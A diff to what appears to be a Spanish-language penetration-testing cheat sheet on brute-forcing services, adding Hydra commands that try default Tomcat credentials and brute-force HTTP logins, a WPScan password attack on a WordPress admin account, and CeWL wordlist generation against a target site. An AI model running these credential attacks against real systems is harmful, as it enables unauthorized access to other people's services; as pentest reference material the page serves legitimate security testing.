@@ -10,6 +10,8 @@ header:
   background: black
 ---
 
+<h1>Fuerza bruta a servicios</h1>
+
 <h2><b>Hydra</b></h2>
 <div class="grid">
   <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">FTP</div>
@@ -67,9 +69,32 @@ hydra -L users.txt -P passwords.txt 192.168.1.100 http-head /webdav/ -o http-cre
 ~~~
 
 <div class="grid">
+  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">HTTP - Tomcat</div>
+</div>
+
+~~~bash
+hydra -C /usr/share/seclist/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt -s 8080 192.168.1.100 http-get /webauth 
+~~~
+
+<h2><b>Otras herramientas</b></h2>
+
+<div class="grid">
   <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">HTTP - WPscan</div>
 </div>
 
 ~~~bash
 wpscan --url http://192.168.1.100/wp --passwords=passwords.txt --usernames admin -t 20​
+~~~
+
+<h1>Misc</h1>
+
+<div class="grid">
+  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">CeWL</div>
+</div>
+[https://github.com/digininja/CeWL.git](https://github.com/digininja/CeWL.git)
+
+Generador de wordlists que recopila palabras clave de las URL del objetivo (spider del target). Esta lista puede ser utilizada como diccionario para logins en aplicaciones web.
+
+~~~bash
+./cewl example.com -d 1 -w example-keywords.txt
 ~~~
